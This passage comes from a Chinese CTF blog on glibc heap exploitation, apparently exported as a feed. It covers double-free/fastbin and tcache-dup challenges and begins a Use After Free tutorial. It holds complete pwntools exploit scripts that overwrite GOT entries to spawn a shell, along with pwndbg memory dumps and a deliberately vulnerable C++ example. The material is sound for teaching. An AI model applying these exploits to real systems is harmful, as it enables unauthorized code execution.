<p>现在我们删除chunk，再次观察这里的内存<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 0 #free ptr[0]</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 1 #free ptr[1]</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash">  x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 0 #free ptr[0] again</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x00000000006026a0	0x0000000000000000 #bp -&gt; 0x6026a0</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000 #bp -&gt; 0x602670</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>可以看到上面释放了之后形成了一个双向链表，如果我们继续申请内存，就会申请在0x602670处，这里我们申请到0x602660，其ASCII码为<code>&amp;</code><br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 2</span><br><span class="line">25 `&amp;`</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000602660	0x0000000000000000 #bp -&gt; 0x602660</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>我们继续申请内存就会申请到0x602670处的地方<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 3</span><br><span class="line">25 cccccccc</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000602660	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6363636363636363	0x0000000000000000 #'cccccccc'</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>如果我们继续申请，就会覆盖0x602670处的内容，也就是覆盖这个双链表的内容<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 4</span><br><span class="line">25 deadbeef</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x6665656264616564	0x0000000000000000 #'deadbeef'</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6363636363636363	0x0000000000000000 #'cccccccc'</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>因为0x602670处指向了0x602660，所以我们再次申请内存就会写在0x602660处<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 5</span><br><span class="line">25 dddddddd</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x6464646464646464	0x0000000000000000 #'dddddddd'</span><br><span class="line">0x602670:	0x6665656264616564	0x0000000000000000 #'deadbeef'</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6363636363636363	0x0000000000000000 #'cccccccc'</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>既然0x602660处的地址可以利用，那意味着我们可以将malloc()函数修改为sh()的地址，然后getshell，我们先查看一下函数的地址<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# objdump -R heap</span><br><span class="line"></span><br><span class="line">heap：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601078 R_X86_64_COPY     stdout@@GLIBC_2.2.5</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5</span><br><span class="line">0000000000601030 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5</span><br><span class="line">0000000000601038 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5</span><br><span class="line">0000000000601040 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5</span><br><span class="line">0000000000601048 R_X86_64_JUMP_SLOT  malloc@GLIBC_2.2.5</span><br><span class="line">0000000000601050 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5</span><br><span class="line">0000000000601058 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7</span><br><span class="line">0000000000601060 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = &#123;void (char *)&#125; 0x4007d7 &lt;sh&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我们将地址改为sh()之后还需要一个参数’sh’，我们需要在0x601040处写入’sh’，也就是get函数的地方，最后调用malloc的时候sz替换为’sh’的地址即可，exp如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./heap'</span>)</span><br><span class="line">elf =ELF(<span class="string">'./heap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send( x + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">molloc</span><span class="params">(i,s)</span>:</span></span><br><span class="line">    cmd(<span class="string">'1 %d\n25 %s'</span>%(i,s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(i)</span>:</span></span><br><span class="line">    cmd(<span class="string">'2 %d'</span>%i)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(i)</span>:</span></span><br><span class="line">    cmd(<span class="string">'3 %d'</span>%i)</span><br><span class="line"></span><br><span class="line">molloc(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">molloc(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">molloc(<span class="number">2</span>,p64(<span class="number">0x0601040</span>)) <span class="comment"># 指向 0x601040 处地址的内容</span></span><br><span class="line">molloc(<span class="number">3</span>,<span class="string">'aabb'</span>)</span><br><span class="line">molloc(<span class="number">4</span>,<span class="string">'aabb'</span>)</span><br><span class="line">x = p64(<span class="number">0x6873</span>) + p64(<span class="number">0x4007d7</span>)  <span class="comment"># 0x601040 内容修改为 system('sh')</span></span><br><span class="line">molloc(<span class="number">5</span>,x) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1 6'</span>)</span><br><span class="line">p.sendline(<span class="string">'6295616 aaaaaaaa'</span>)  <span class="comment"># 执行 0x601040 处内容 0x601040 = 6295616 </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="Example-Two"><a href="#Example-Two" class="headerlink" title="Example Two"></a>Example Two</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/ThunderJie/CTF-Practice/blob/master/CTF-Pwn/babytcache/babytcache" target="_blank" rel="noopener">babytcache</a></p>
<p>这道题需要了解一些tcache的知识，<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#tcache-dup" target="_blank" rel="noopener">CTF-Wiki</a>上有详细的介绍，简单来说就是tcache_put() 的不严谨<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list，这里其实就有点像Double Free的感觉，只是Double Free不能连续free而这里可以，运行了解一下程序，是一个常见的管理系统<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# ./babytcache </span><br><span class="line">NoteBook v0.1</span><br><span class="line">1.add a note</span><br><span class="line">2.delete a note</span><br><span class="line">3.show a note</span><br><span class="line">4.exit</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>IDA分别分析一下每个函数的内容</p>
<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><p>这里将创建的地址都放在了ptr[]的地方，也就是0x6020E0处<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_a_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_6020C0 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Full!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">  v1 = dword_6020C0;</span><br><span class="line">  ptr[v1] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line">  sub_4008A6((__int64)ptr[dword_6020C0], <span class="number">0x50</span>u);</span><br><span class="line">  ++dword_6020C0;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v0 = sub_400920();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; dword_6020C0 )</span><br><span class="line">    <span class="built_in">free</span>(ptr[v0]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of range!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="show-note"><a href="#show-note" class="headerlink" title="show_note"></a>show_note</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_a_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = sub_400920();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; dword_6020C0 )</span><br><span class="line">    result = <span class="built_in">puts</span>(ptr[v1]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"out of range!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们首先创建一个note,然后释放三次<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap</span></span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 593, </span><br><span class="line">  fd = 0x300000000, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603250 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 97, </span><br><span class="line">  fd = 0x603260, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6032b0 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 134481, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0x60 [  3]: 0x603260 ◂— 0x603260 /* '`2`' */ #free three times</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></p>
<p>这道题并没有给system函数和’/bin/sh’,所以我们需要泄露出system函数的地址，然后想办法改got表。</p>
<p>我们将0x6020e0位置的指针改为puts函数的got表指针,然后就可以泄露puts函数的在libc的地址,计算出system函数的地址,然后用同样的方法将puts的got表覆盖为system函数的地址,最后调用puts()实现getshell,偏移的计算是在接受到puts函数地址的时候,用vmmap打印出libc地址,然后相减就行了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./babytcache'</span>)</span><br><span class="line"></span><br><span class="line">symbol = ELF(<span class="string">'./babytcache'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(content)</span>:</span></span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	r.sendline(<span class="string">'1'</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">	r.sendline(content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line"></span><br><span class="line">	r.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	r.sendline(<span class="string">'2'</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">	r.sendline(<span class="string">'%d'</span>%index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span><span class="params">(index)</span>:</span></span><br><span class="line"></span><br><span class="line">	r.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	r.sendline(<span class="string">'3'</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">	r.sendline(<span class="string">'%d'</span>%index)</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">'aaaaaaaa'</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_note(p64(<span class="number">0x6020e0</span>+<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">add_note(p64(symbol.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">show_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = (u64(r.recv(<span class="number">6</span>)+ <span class="string">'\x00\x00'</span>)) <span class="comment">#receive 'puts'</span></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">padding1 = <span class="number">0x809c0</span></span><br><span class="line"></span><br><span class="line">padding2 = <span class="number">0x4f440</span></span><br><span class="line"></span><br><span class="line">libc_addr = puts_addr - padding1</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + padding2</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_note(p64(symbol.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">add_note(p64(system_addr))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.sendline(<span class="string">'0'</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="0x03：总结"><a href="#0x03：总结" class="headerlink" title="0x03：总结"></a>0x03：总结</h1><p>pwn的堆就应该多刷题…刷多了一看就知道哪里有问题了</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>PWN</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>Double Free</tag>
        <tag>fastbin</tag>
      </tags>
  </entry>
  <entry>
    <title>Use After Free</title>
    <url>/2019/03/04/Use-After-Free/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>读了大佬推荐的Linux内存管理文章，感觉多多少少了解了一些Linux下堆的管理，前段时间一直在学Windows内核，现在又来恶补Linux，菜是原罪，话不多说，这里我就记录一下堆溢出中最简单的题目</p>
<h1 id="0x01：漏洞介绍"><a href="#0x01：漏洞介绍" class="headerlink" title="0x01：漏洞介绍"></a>0x01：漏洞介绍</h1><p>Glibc Heap 利用中，Use After Free(UAF)是很常见的一种，那么什么是UAF呢？</p>
<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
</ul>
<p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
<h1 id="0x02：例子"><a href="#0x02：例子" class="headerlink" title="0x02：例子"></a>0x02：例子</h1><h2 id="Example-One"><a href="#Example-One" class="headerlink" title="Example One"></a>Example One</h2><p>首先创建一个UAF.cpp，内容如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"class A"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"class B"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    A *p = <span class="keyword">new</span> B();</span><br><span class="line">    <span class="keyword">delete</span> p;       <span class="comment">//删除堆p</span></span><br><span class="line">    fgets(buf,<span class="keyword">sizeof</span>(buf),<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">char</span> *q = strdup(buf);</span><br><span class="line"></span><br><span class="line">    p-&gt;print();     <span class="comment">//继续使用p，触发漏洞，程序会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ use_after_free.cpp -o use_after_free -g -w -no-pie</span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# ./UAF</span><br><span class="line">aaaa</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure></p>
<p>为什么错误呢？原因很简单，我们之前已经释放过p了，现在又来调用当然会错误，现在我们动态调试一下。<br>首先我们需要在main函数下个断点，然后单步观察<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b main</span></span><br><span class="line">Breakpoint 1 at 0x400863: file UAF.cpp, line 32.</span><br></pre></td></tr></table></figure></p>
<p>我们运行到delete p的地方<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> n</span></span><br><span class="line">34        delete p;       //删除堆p</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RBX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RCX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RDX  0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RDI  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x7ffff7a488c0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x602010 ◂— 0x0</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe0e0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  